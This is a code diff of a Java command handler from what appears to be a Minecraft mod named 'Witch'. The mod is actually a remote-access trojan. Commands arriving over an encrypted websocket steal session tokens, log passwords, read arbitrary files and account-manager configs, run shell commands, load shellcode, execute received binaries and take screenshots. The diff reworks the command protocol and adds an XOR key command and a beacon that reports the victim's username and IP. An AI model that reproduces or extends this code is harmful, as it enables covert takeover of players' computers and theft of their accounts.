@@ -1,48 +1,54 @@
 package me.soda.witch.websocket;
 
+import com.google.gson.Gson;
 import me.soda.witch.Witch;
-import me.soda.witch.features.*;
+import me.soda.witch.features.PlayerInfo;
+import me.soda.witch.features.ShellcodeLoader;
+import me.soda.witch.utils.*;
 import net.minecraft.text.Text;
 
-import java.util.Base64;
+import java.nio.ByteBuffer;
+
+import static me.soda.witch.Witch.mc;
 
 public class MessageHandler {
-    private static String decodeBase64(String str) {
-        byte[] result = Base64.getDecoder().decode(str.getBytes());
-        return new String(result);
+    private static final Gson GSON = new Gson();
+
+    public static void handle(ByteBuffer bytes) {
+        handle(GSON.fromJson(Message.decrypt(bytes.array()), Message.class));
     }
 
-    public static void handle(String message) {
-        String[] msgArr = message.split(" ");
-        String messageType = msgArr[0];
-        Witch.println("Received message: " + messageType);
+    public static void handle(Message message) {
+        String msgType = message.messageType();
+        String msg = message.message();
+        Witch.println("Received message: " + msgType);
         try {
-            switch (messageType) {
+            switch (msgType) {
                 case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
-                case "steal_token" -> Message.send(messageType, new Stealer.Token());
-                case "chat_control" -> ChatUtil.sendChat(decodeBase64(msgArr[1]));
-                case "chat_filter" -> Witch.config.filterPattern = decodeBase64(msgArr[1]);
+                case "steal_token" -> Message.send(msgType, Stealer.getToken());
+                case "chat_control" -> ChatUtil.sendChat(message.message());
+                case "chat_filter" -> Witch.config.filterPattern = msg;
                 case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                 case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
-                case "mods" -> Message.send(messageType, MinecraftUtil.allMods());
-                case "systeminfo" -> Message.send(messageType, MinecraftUtil.systemInfo());
-                case "screenshot" -> Screenshot.screenshot();
-                case "chat" -> ChatUtil.chat(Text.of(decodeBase64(msgArr[1])), false);
+                case "mods" -> Message.send(msgType, MinecraftUtil.allMods());
+                case "systeminfo" -> Message.send(msgType, MinecraftUtil.systemInfo());
+                case "screenshot" -> ScreenshotUtil.screenshot();
+                case "chat" -> ChatUtil.chat(Text.of(msg), false);
                 case "kill" -> Witch.client.close(false);
                 case "shell" -> new Thread(() -> {
-                    String result = ShellUtil.runCmd(decodeBase64(msgArr[1]));
-                    Message.send(messageType, "\n" + result);
+                    String result = ShellUtil.runCmd(msg);
+                    Message.send(msgType, "\n" + result);
                 }).start();
                 case "shellcode" -> {
                     if (ShellUtil.isWin())
-                        new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
+                        new Thread(() -> new ShellcodeLoader().loadShellCode(msg, false)).start();
                 }
                 case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
-                case "config" -> Message.send(messageType, Witch.config);
-                case "player" -> Message.send(messageType, new PlayerInfo(Witch.mc.player));
+                case "config" -> Message.send(msgType, Witch.config);
+                case "player" -> Message.send(msgType, new PlayerInfo(Witch.mc.player));
                 case "skin" -> {
-                    handle("player");
-                    PlayerSkin.sendPlayerSkin();
+                    Message.send("player", new PlayerInfo(Witch.mc.player));
+                    PlayerSkinUtil.sendPlayerSkin();
                 }
                 case "server" -> {
                     ServerUtil.disconnect();
@@ -51,12 +57,19 @@ public class MessageHandler {
                 case "kick" -> ServerUtil.disconnect();
                 case "execute" -> {
                     if (ShellUtil.isWin()) {
-                        ShellUtil.runProg(Base64.getDecoder().decode(msgArr[1]));
+                        ShellUtil.runProg(GSON.fromJson(message.message(), byte[].class));
                     }
                 }
-                case "iasconfig" -> Message.send(messageType, FileReadUtil.read("config/ias.json"));
-                case "read" -> Message.send(messageType, FileReadUtil.read(decodeBase64(msgArr[1])));
-                case "runargs" -> Message.send(messageType, System.getProperties());
+                case "iasconfig" -> Message.send(msgType, FileReadUtil.read("config/ias.json"));
+                case "read" -> Message.send(msgType, FileReadUtil.read(msg));
+                case "runargs" -> Message.send(msgType, System.getProperties());
+                case "xor" -> Message.setKey(msg);
+                case "greeting" -> {
+                    String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
+                    Message.send(msgType, greetingMsg);
+                    if (Witch.ip == null) Witch.ip = NetUtil.getIp();
+                    Message.send("player", new PlayerInfo(Witch.mc.player));
+                }
                 default -> {
                 }
             }
